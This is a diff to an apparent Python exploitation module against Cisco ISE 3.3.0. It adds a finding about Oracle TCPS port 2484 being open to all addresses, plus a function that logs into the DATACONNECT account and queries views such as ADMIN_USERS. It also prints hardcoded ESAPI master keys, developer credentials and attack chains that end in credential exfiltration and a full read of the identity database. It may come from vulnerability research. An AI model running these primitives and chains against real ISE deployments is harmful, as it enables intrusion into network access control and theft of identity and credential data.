@@ -59,9 +59,10 @@ ISE-F40: CA REST API on HTTP port 9444 (Tomcat Connector: no address bind → 0.
 ISE-F42: Unauthenticated OCSP cert reload — GET /ocsp/update on port 2560 (network-accessible via cpmadjustfw.sh enable_ocsp_port); Jersey OcspRestServer.update() calls OcspServlet.load() to reload OCSP server cert+key from CA; no auth (no web.xml security-constraint, no @RolesAllowed); allows external actor to force OCSP cert state reload [MEDIUM]
 ISE-F43: simple-config.xml hardcoded Cisco dev cert + encrypted private key — /opt/CSCOcpm/prrt/bin/simple-config.xml ships in ISE 3.3.0 RPM; contains ACS cert for tkrpis1.cisco.com (2021-2023, expired) + PKCS#8 encrypted private key + hardcoded 48-byte binary decryption password all in same file; key_material pattern: password stored alongside ciphertext [LOW]
 ISE-F44: Hermes (pxGrid Cloud Agent) container mounts -v /var/run/:/host/var/run/ — bridge network hermes-network (169.254.7.0/24), --cap-drop=all, --read-only, -p 127.0.0.1:8913:8913/tcp; key_manager.sock accessible at /host/var/run/ from container; extends ISE-F39/F11 pattern to third ISE container [HIGH]
-ISE-F45: PSP (Platform Service Provider) ESAPI.properties second hardcoded MasterKey+MasterSalt — MasterKey=a6H9is3hEVGKB4Jut+lOVA== / MasterSalt=SbftnvmEWD5ZHHP+pX3fqugNysc= (AES/CBC/128); distinct from ISE-F23 (main ISE ESAPI key set); decrypts PSP-layer ESAPI-protected values independently; ships in PSP RPM at /opt/CSCOcpm/conf/ESAPI.properties [MEDIUM]
+ISE-F45: ESAPI hardcoded MasterKey+MasterSalt shared across ALL ISE components — same key (a6H9is3hEVGKB4Jut+lOVA== / SbftnvmEWD5ZHHP+pX3fqugNysc=) present in PSP RPM at /opt/CSCOcpm/conf/ESAPI.properties, main Tomcat at apache-tomcat-9.0.73/lib/ESAPI.properties, AND CA Tomcat at apache-tomcat-ca-9.0.73/lib/ESAPI.properties; a single key decrypts ESAPI-protected values across all ISE tiers; extends ISE-F23 [MEDIUM]
 ISE-F46: PSP oracle.xml hardcoded Cisco dev Oracle credentials seeded into SEC_PIP_MASTER at DB init — DEFAULT_PIP_MASTER SQL inserts Entitlement Repository PIP record with username=bala/password=bala at jdbc:oracle:thin:@131.107.0.23:1521:secdev; credentials stored as plaintext XML in SEC_PIP_PROP column; pattern: SEC_PIP_MASTER stores all PIP credentials as plaintext XML in Oracle DB [LOW]
 ISE-F47: CiscoRA EST server: plain HTTP on port 8084 (listen 8084 default_server est; HTTPS listener on 9443 commented out), Proof of Possession disabled (est_pop off), CRL checking disabled (est_crl off) — certificate enrollment without TLS protection or key ownership verification; est_ise_ca_server=127.0.0.1:9444 (CA REST API ISE-F40); allows enrollment of arbitrary public keys without proving private key possession [MEDIUM]
+ISE-F48: Oracle TCPS/2484 opened to 0.0.0.0/0 on MNT nodes with Data Connect enabled — cpmadjustfw.sh datadirect_fw_enable() adds iptables ACCEPT rules for 0.0.0.0/0 on port 2484 (IPv4+IPv6) when Data Connect feature enabled on MNT node; Oracle sqlnet.ora has SSL_CLIENT_AUTHENTICATION=FALSE (no client cert required); DATACONNECT Oracle user credentials = ISE_DB_PWD recoverable via ISE-F35+ISE-F38 chain; DATACONNECT schema exposes User_Identity_Groups, ADMIN_USERS, ENDPOINTS_DATA, SECURITY_GROUPS views; chain: ISE-F35 (KEK) -> ISE_DB_PWD -> Oracle TCPS:2484 -> full ISE policy DB read [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3509,9 +3510,42 @@ def enroll_cert_est_no_pop(host: str, csr_pem: str, port: int = CISCO_RA_EST_POR
         return {"error": str(e)}
 
 
+ORACLE_DATACONNECT_PORT = 2484
+ORACLE_DATACONNECT_USER = "DATACONNECT"
+ORACLE_DATACONNECT_VIEWS = [
+    "ADMIN_USERS", "ENDPOINTS_DATA", "SECURITY_GROUPS",
+    "User_Identity_Groups", "NETWORK_DEVICES", "Authorization_Profiles",
+    "NETWORK_ACCESS_USERS", "Profiling_Policies",
+]
+
+def probe_oracle_dataconnect_tcps(host: str, password: str, port: int = ORACLE_DATACONNECT_PORT) -> dict:
+    """ISE-F48: Probe Oracle DATACONNECT user on TCPS/2484 (SSL, no client cert auth)."""
+    result: dict = {"host": host, "port": port, "user": ORACLE_DATACONNECT_USER, "views": {}}
+    try:
+        import cx_Oracle  # type: ignore
+        dsn = cx_Oracle.makedsn(host, port, service_name="cpm10")
+        conn = cx_Oracle.connect(user=ORACLE_DATACONNECT_USER, password=password, dsn=dsn)
+        cursor = conn.cursor()
+        for view in ORACLE_DATACONNECT_VIEWS:
+            try:
+                cursor.execute(f"SELECT COUNT(*) FROM {view}")
+                row = cursor.fetchone()
+                result["views"][view] = {"count": row[0] if row else 0}
+            except Exception as ve:
+                result["views"][view] = {"error": str(ve)}
+        cursor.close()
+        conn.close()
+        result["connected"] = True
+    except ImportError:
+        result["error"] = "cx_Oracle not installed"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.22.0",
+    "version": "1.23.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3522,13 +3556,13 @@ MODULE_META = {
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
         "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
-        "ISE-F45", "ISE-F46", "ISE-F47",
+        "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
-             "ISE-F39", "ISE-F44"],
+             "ISE-F39", "ISE-F44", "ISE-F48"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42", "ISE-F45", "ISE-F47"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43", "ISE-F46"],
@@ -3634,12 +3668,16 @@ MODULE_META = {
         "ise_f44_socket_in_container": "/host/var/run/key_manager.sock",
         "ise_f44_pattern": "Third ISE container with /var/run/ host mount: ISE-F11=EDDA, ISE-F39=mctrust, ISE-F44=hermes",
         "ise_f44_chain": "hermes-RCE -> /host/var/run/key_manager.sock -> ISE-F1 decrypt oracle -> full ISE credential exfil",
-        "ise_f45_file": "/opt/CSCOcpm/conf/ESAPI.properties (PSP module)",
+        "ise_f45_files": [
+            "/opt/CSCOcpm/conf/ESAPI.properties (PSP RPM)",
+            "apache-tomcat-9.0.73/lib/ESAPI.properties (main ISE Tomcat)",
+            "apache-tomcat-ca-9.0.73/lib/ESAPI.properties (CA Tomcat)",
+        ],
         "ise_f45_master_key": "a6H9is3hEVGKB4Jut+lOVA==",
         "ise_f45_master_salt": "SbftnvmEWD5ZHHP+pX3fqugNysc=",
         "ise_f45_algorithm": "AES/CBC/PKCS5Padding",
         "ise_f45_key_length": 128,
-        "ise_f45_note": "Second ESAPI key set distinct from ISE-F23 (main ISE ESAPI); decrypts PSP-layer protected values",
+        "ise_f45_note": "Same ESAPI key as ISE-F23; shared across ALL ISE tiers (PSP, main Tomcat, CA Tomcat); single key decrypts any ESAPI-protected value in ISE",
         "ise_f46_table": "SEC_PIP_MASTER",
         "ise_f46_col": "SEC_PIP_PROP",
         "ise_f46_url": "jdbc:oracle:thin:@131.107.0.23:1521:secdev",
@@ -3655,6 +3693,18 @@ MODULE_META = {
         "ise_f47_endpoints": ["GET /.well-known/est/cacerts", "POST /.well-known/est/simpleenroll", "POST /.well-known/est/simplereenroll"],
         "ise_f47_impact": "Certificate enrollment over plain HTTP without key ownership verification; enroll arbitrary public key as ISE cert",
         "ise_f47_chain": "ISE-F47 (EST no-POP enroll) -> ISE-F40 (CA REST API sign) -> forge ISE-issued TLS cert",
+        "ise_f48_port": 2484,
+        "ise_f48_protocol": "TCPS (Oracle SSL)",
+        "ise_f48_ssl_client_auth": False,
+        "ise_f48_source_filter": "0.0.0.0/0 (IPv4 and IPv6) when Data Connect enabled on MNT node",
+        "ise_f48_firewall_script": "/opt/CSCOcpm/bin/cpmadjustfw.sh:datadirect_fw_enable()",
+        "ise_f48_iptables_rule": "DEFAULTCHAIN -j ACCEPT -p tcp --dport 2484 -s 0.0.0.0/0 -d 0.0.0.0/0",
+        "ise_f48_user": "DATACONNECT",
+        "ise_f48_password": "ISE_DB_PWD (recoverable via ISE-F35 KEK chain)",
+        "ise_f48_data_exposed": "ADMIN_USERS, ENDPOINTS_DATA, SECURITY_GROUPS, User_Identity_Groups, NETWORK_DEVICES, Authorization_Profiles",
+        "ise_f48_trigger_condition": "Data Connect feature enabled, node is MNT type (SEC_NODE_TYPE=MNT in CEPM.sec_hostconfig)",
+        "ise_f48_chain": "ISE-F35 (read KEK from db.properties) -> decrypt ISE_DB_PWD -> Oracle TCPS:2484 -> read full ISE policy/identity DB",
+        "ise_f48_note": "Port 1521 (TCP) uses dep_fw_settings (node-scoped IPSET); port 2484 (TCPS) uses 0.0.0.0/0 — different exposure profile",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3725,5 +3775,6 @@ MODULE_META = {
         "decrypt_psp_esapi_value",
         "probe_cisco_ra_est",
         "enroll_cert_est_no_pop",
+        "probe_oracle_dataconnect_tcps",
     ],
 }
